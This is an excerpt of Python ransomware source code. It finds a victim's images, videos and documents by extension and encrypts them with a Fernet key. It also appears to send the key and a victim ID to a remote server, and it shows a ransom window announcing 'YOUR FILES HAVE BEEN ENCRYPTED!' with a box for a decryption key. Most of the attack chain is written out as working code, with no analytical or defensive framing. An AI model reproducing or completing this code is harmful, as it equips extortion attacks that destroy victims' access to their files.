...
import os, smtplib, platform, random, requests, pymysql, pwd, time
    ...
    for u in folders:
        ...
        for ext in extensions:
            for mainfolder, dirs, files in os.walk(mainpath):
                for file in files:
                    if file.endswith(ext): #Depending the extension file, save paths in different lists
                        if ext == '.jpg' or ext == '.jpeg':

                            images.append(os.path.join(mainfolder, file))

                        elif ext == '.mp3' or ext == '.mp4' or ext == '.wav' or ext == '.avi':

                            videos.append(os.path.join(mainfolder, file))

                        elif ext == '.pdf' or ext == '.docx' or ext == '.csv' or ext == '.doc':

                            documents.append(os.path.join(mainfolder, file))
def Generate_Key():
    secretkey = Fernet.generate_key()
    return secretkey

def Generate_Random_ID():
    idnumber = random.randint(1000000000000000000000,999999999999999999999999999)
    return idnumber
    
def Encrypt_File(f,pathlist):
...
def Encrypt_File_List(key,images,videos,documents):

    f = Fernet(key)
    executor = ThreadPoolExecutor(max_workers=3)
    #Check if list with paths is not empty
    if images:
        executor.submit(Encrypt_File, f, images)
    else:
        pass
    if videos:
        executor.submit(Encrypt_File, f, videos)
    else:
        pass
    if documents:
        executor.submit(Encrypt_File, f, documents)
    else:
        pass

def Create_File_Paths(images,videos,documents):

    victimlist = images + videos + documents
...
class RansomGUI:
    def __init__(self):
        ...
        self.info1 = Label(foreground='yellow', background='red',font=("Arial Bold", 20),text="DON'T PANIC!")
        self.info2 = Label(foreground='yellow', background='red',font=("Arial Bold", 16),text='YOUR FILES HAVE BEEN ENCRYPTED!')
        ...
        self.info4 = Label(foreground='yellow', background='red',font=("Arial Bold", 12),text="DECRYPTION KEY:")
        self.caja = Entry(width=36,textvariable=self.randomkey)
        self.boton = Button(text='RECOVER MY FILES!',command=self.Decrypt_File_List)

        self.logo = PhotoImage(file='logo.png')
        self.image = Label(image=self.logo, background='red')
...
def main():
    if not os.path.exists('victims'):    
        ...
        videos = []
        documents = []
        Discover_Files(images,videos,documents)
        idnumber = Generate_Random_ID()
        key = Generate_Key()
        Encrypt_File_List(key,images,videos,documents)
        Send_To_Server(key,idnumber)
        Create_File_Paths(images,videos,documents)
